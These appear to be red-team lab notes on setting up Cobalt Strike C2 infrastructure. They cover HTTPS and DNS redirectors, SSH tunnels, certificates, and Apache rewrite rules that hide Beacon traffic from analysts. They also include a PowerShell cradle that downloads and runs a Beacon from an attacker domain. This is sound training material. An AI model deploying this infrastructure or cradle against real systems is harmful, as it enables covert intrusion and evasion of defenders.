# Defense in depth
Focus on creating C2 Infrastructure that is both secure and resilient. This is to avoid any issues with exposing data from operations. 

# Infrastructure Design

A good design to follow:

Use an encrypted protocol, like HTTPS, to egress C2 traffic. Cobalt Strike does also AES encrypt the Beacon traffic before encapsulation, so P2P, DNS, and externalC2 traffic has a layer of protection. 

An SSH or VPN tunnel is setup from the C2 server to an HTTPS redirector, it must be in this direction becuase:
1. the simulated adversary area should not have direct inbound access from the internet
2. you don't want sensitive private keys or credentials for the C2 server on the untrusted redirectors

# Apache installation

Setting up an apache reverse proxy is more effective. Let's do so with the below setup commands to install the required tooling:

```
sudo apt install apache2
sudo a2enmod ssl rewrite proxy proxy_http
```

Now to setup apache with SSL:

```
ll
sudo rm 000-default.conf
sudo ln -s ../sites-available/default-ssl.conf .
ll
```

Restart apache:
```
sudo systemctl restart apache2
```

## SSL certificates

We need to setup some domain names for use. In the lab we will use PowerDNS which can be accessed via the application menu on the dashboard. 

Default domain is `infinity-bank.com`, or you can create an arbitrary one. Have it set so it points to the redirector you created: 

| Name | Type  | Data               |
| ---- | ----- | ------------------ |
| @    | A     | 10.10.0.100        |
| www  | CNAME | infinity-bank.com. |
Once saved and applied, verify with dig:
```
dig infinity-bank.com +short
dig www.infinity-bank.com +short
```

Now generate a public/private keypair to use with apache, we can create them in WSL on our attacker desktop VM and copy them over with scp:
```
openssl genrsa -out infinity-bank.key 2048
openssl req -new -key infinity-bank.key -out infinity-bank.csr
```

Have these verified by a legitimate CA in real world, for lab we will use a fake CA.

First we need to create a new file named: `infinity-bank.ext`:
```
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = infinity-bank.com
DNS.2 = www.infinity-bank.com
```

Now generate a signed certificate:
```
openssl x509 -req -in infinity-bank.csr -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial -out infinity-bank.crt -days 365 -sha256 -extfile ca/infinity-bank.ext
```

Can verify the creation with:
```
openssl x509 -noout -text -in infinity-bank.crt
```

Now copy the private key and public cert to the redirector:

```
scp infinity-bank.key attacker@10.10.0.100:/home/attacker/private.key
scp infinity-bank.crt attacker@10.10.0.100:/home/attacker/public.crt
```

Copy the private key into `/etc/ssl/private` and the public certificate into `/etc/ssl/certs`
```
sudo cp private.key /etc/ssl/private/
sudo cp public.crt /etc/ssl/certs/
```

Open `/etc/apache2/sites-enabled/default-ssl.conf` in a text editor (nano or vim) and look for lines 32-33. Replace the snakeoil fake paths for the ones we just copied, save the file and restart apache2:
```
sudo systemctl restart apache2
```

## Beacon Certificates

Generate a self-signed pair, but install the public certificate on the redirector so that it becomes trusted.

```
openssl req -x509 -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.crt -sha256 -days 365 -subj '/CN=localhost'
```

Combine the separate public and private files into a single PFX file

```
openssl pkcs12 -inkey localhost.key -in localhost.crt -export -out localhost.pfx
```

The PFX file can then be converted to a Java KeyStore using the `keytool` utility.  The password of this new store can be the same or different to the one you used to export the PKCS12.

```
keytool -importkeystore -srckeystore localhost.pfx -srcstoretype pkcs12 -destkeystore localhost.store
```

will produce a new file, `localhost.store`, which needs to be copied this to the team server

```
rm localhost.pfx
scp localhost.store attacker@10.10.5.50:/home/attacker/cobaltstrike/
```

Modify `/home/attacker/cobaltstrike/c2-profiles/normal/webbug.profile` and add the following to the top

```
https-certificate {
     set keystore "localhost.store";
     set password "pass123";
}
```

Launch the team server
```
sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
```

start a new HTTPS listener using the domain name

verify the certificate on the listener by hitting it with `curl`

```
curl -v -k https://10.10.5.50
```

## SSH Tunnel

need to create a reverse SSH tunnel from the team server to Redirector 1

```
ssh -N -R 8443:localhost:443 attacker@10.10.0.100
```

-N stops the session from dropping in to a shell
-R is remote-port:host:host-port this will bind port 8443 on the target, redirector 1, and any traffic hitting that port will be redirected to 127.0.0.1:443 on the team server. The cobalt strike listener binds to all interfaces so this will cause the traffic to hit the listener

**Note** run above command in tmux or screen

The command will appear like the terminal is frozen, you can cancel with `Ctrl+C` any time to close the session. You can list the listening ports on redirector 1 to confirm that the SSH daemon is bound to 8443 with `sudo ss -ltnp`

Now you can curl localhost:8443 on redirector 1 and it will hit the Cobalt listener, however, it will throw an SSl cert untrusted error

To get around this we need to add localhost.crt to the trusted certs on redirector 1, first transfer from WSL:

```
ssh -N -R 8443:localhost:443 attacker@10.10.0.100
```

Copy the cert over to the cert store and run a cert update

```
sudo cp localhost.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates
```

Now you won't have cert SSL errors

For additional convenience you can use [autossh](https://linux.die.net/man/1/autossh) to create the SSH tunnel, on the team server VM create a new file at `.ssh/config` with this in it:

```
Host                 redirector-1
HostName             10.10.0.100
User                 attacker
Port                 22
IdentityFile         /home/attacker/.ssh/id_rsa
RemoteForward        8443 localhost:443
ServerAliveInterval  30
ServerAliveCountMax  3
```

Then turn it on with: 

```
autossh -M 0 -f -N redirector-1
```

-M 0 disables the autossh monitoring port
-f tells autossh to run in the background

## Enabling Apache Redirection

Configure apache to proxy traffic through to the Cobalt Strike listener

Directly underneath the closing `</VirtualHost>` tag, add a new `<Directory>` block with the following content:

```
<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
```

We also need to add `SSLProxyEngine on` underneath `SSLEngine on`, and then restart apache

Next create an .htaccess file in the apache web root `/var/www/html` and enter the following:

```
RewriteEngine on
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

After saving the file, we can test it with curl from the Attacker Desktop. `curl https://infinity-bank.com/test`

and it should hit the team server with a request against /test

further testing would be to execute a beacon on workstation 1:

```
iex (new-object net.webclient).downloadstring("https://www.infinity-bank.com/a")
```

Multiple htaccess flags can be used with the syntax `[Flag1,Flag2,FlagN]`.  Other useful flags include:

[L] - Last.  Tells `mod_rewrite` to stop processing further rules.
[NE] - No Escape.  Don't encode special characters (e.g. `&` and `?`) to their hex values.
[R] - Redirect.  Send a redirect code in response.
[S] - Skip.  Skip the next N number of rules.
[T] - Type.  Sets the MIME type of the response.

Rewrite conditions (RewriteCond) can be combined with RewriteRule. These allow rewrite rules to only be applied under certain conditions. The syntax is `TestString Condition [Flags]`.  TestString can be static but also a variable, such as `%{REMOTE_ADDR}`, `%{HTTP_COOKIE}`, `%{HTTP_USER_AGENT}`, `%{REQUEST_URI}` and more.

Multiple RewriteCond rules can be defined which are treated like ANDs by default, but can be treated as ORs with an `[OR]` flag.  You can have multiple RewriteCond and RewriteRule directives in the same file and they are evaluated top-to-bottom.

Documentation for [this](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html)

## User Agent Roles

Drop the traffic entirely or redirect the request to some dummy content.  First, create that dummy content on the redirector.

```
echo "Nothing to see here..." | sudo tee /var/www/html/diversion
```

Then modify your htaccess file like so:

```
RewriteEngine on

RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

Now if we try and curl our payload at `/a`, we get served our dummy content instead.

## Cookie Rules

Some HTTP(S) C2 profiles use the cookie header to carry Beacon metadata information.  The webbug profile that we're currently using places it in the URL, so let's change it to use a cookie instead.

The metadata block currently looks like this:

```
metadata {
    netbios;
    prepend "__utma";
    parameter "utmcc";
}
```

This appears in the URL as:  &`utmcc=__utmakdmjdffgcepcddbgbegpogkmmdadmcdj`.

Change it to:

```
metadata {
    netbios;
    prepend "SESSIONID=";
    header "Cookie";
}
```

Then it will appear in the HTTP request as:  `Cookie: SESSIONID=kaekkgokannieolldcnhgfahhifcegaj`.

Making modifications to the C2 profile also requires you to restart the team server, regenerate a payload and execute a new Beacon.  Before we touch the htaccess file again, we can prove that we can still hit the team server on a random URI

```
curl https://infinity-bank.com/test
```

And we should see a request against /test on the teamserver

Now let's add a new rewrite condition to the htaccess file

```
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P]
```

This new condition will ensure that a cookie called SESSIONID is present in the request for it to be proxied to the team server.  The Beacon will continue to check-in, because it has this cookie.  But our random GET request will not be proxied and results in a 404 from Apache.

## URI and Query rules

we can write rules that match the exact parameters of our C2 traffic profile

```
./c2lint c2-profiles/normal/webbug.profile
```

The URI for the GET request will always be the same - we can see from the profile that the URI and all of the parameters are hardcoded to static values.

```
set uri "/__utm.gif";

parameter "utmac" "UA-2202604-2";
parameter "utmcn" "1";
parameter "utmcs" "ISO-8859-1";
parameter "utmsr" "1280x1024";
parameter "utmsc" "32-bit";
parameter "utmul" "en-US";
```

The POST request has a single piece of dynamic information in the form of the Beacon ID.

```
set uri "/___utm.gif";

id {
    prepend "UA-220";
    append "-2";
    parameter "utmac";
}

parameter "utmcn" "1";
parameter "utmcs" "ISO-8859-1";
parameter "utmsr" "1280x1024";
parameter "utmsc" "32-bit";
parameter "utmul" "en-US";
```

So this highlighted portion is different per Beacon:  utmac=UA-220**7328**-2.

We can use this information to come up with the following rules.

```
RewriteEngine on

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteCond %{REQUEST_URI} __utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ___utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```

Once saved, the Beacon should continue checking in and respond to commands.  If it stops checking in, there's an issue with the GET rules.  If it checks in, but doesn't seem to respond to commands, there's an issue with the POST rules.

When restricting traffic to the team server, it's pretty easy to break out ability to download hosted files. To address this, we can add some conditions where if the URI matches any of our known filenames, we can allow the traffic like:

```
RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```


## Beacon Staging

don't use staged payloads because they have quite bad OPSEC, but the Cobalt Strike team server still supports this staging process by default

A C2 profile may define specific URLs for x86 and x64 stagers, in an `http-stager` block

```
http-stager {
        set uri_x86 "/_init.gif";
        set uri_x64 "/__init.gif";
        ...
}
```

Why is this staging bad?  One of the reasons is that the request is completely unauthenticated, which means it can be made from anyone or anywhere, it's not limited to a legitimate CS stager.  For instance, we can download the entire shellcode blob.

The use of redirectors can mitigate the risk of these staging URLs being reachable, but since stagers are generally not used anyway, the safest course of action is to just disable them altogether.  This can be done by adding the following configuration to the global options in your C2 profile.

```
set host_stage "false";
```

Restart the team server for the changes to take effect and now any stage requests will return a 404.

## Redirecting DNS

can also redirect DNS traffic through a redirector, for which we'll use **Redirector 2**

need to add the appropriate DNS records to PowerDNS.  In this example, I'm using a subdomain called `bacs` which will ultimately point to `10.10.0.200`:

| Name | Type | Data                   |
| ---- | ---- | ---------------------- |
| ns1  | A    | 10.10.0.200            |
| bacs | NS   | ns1.infinity-bank.com. |
can't use OpenSSH for UDP tunnels, so make a TCP one and redirect the UDP traffic through it. Steps:

```
###TCP Redirect from team server to redirector 2
ssh attacker@10.10.0.200 -R 5353:localhost:5353
###Socat command to listen on UDP 53 on redirector 2 and forward the traffic to TCP 5353
sudo socat udp4-listen:53,reuseaddr,fork tcp:localhost:5353
###Then on team server:
sudo socat tcp-listen:5353,reuseaddr,fork udp4-sendto:localhost:53
```

Create a DNS listener and execute a payload to confirm it is working:
![[Pasted image 20250318101223.png]]

If it doesn't appear us tcpdump to troubleshoot:

```
sudo tcpdump -i ens5 udp port 53
```

## Payload Guardrails

Guardrails in Cobalt Strike are set in the configuration for the DNS, HTTP/S, SMB, and TCP listeners.

The available options are:

- IP Address
    - Internal IP address(es)
    - Supports wildcards on the rightmost segments, e.g. _10.10.120.*_ or _10.10.*.*_
- User Name
    - Case sensitive username
    - Supports wildcards on the left or right, e.g. _svc_*_ or _*adm_
- Server Name
    - Case sensitive computer name
    - Supports wildcard on the left or right
- Domain
    - Case sensitive domain name
    - Supports wildcard on the left or right, e.g. _acme.*_ or _*.acme.corp_

## External C2

Docs [here](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/externalc2spec.pdf)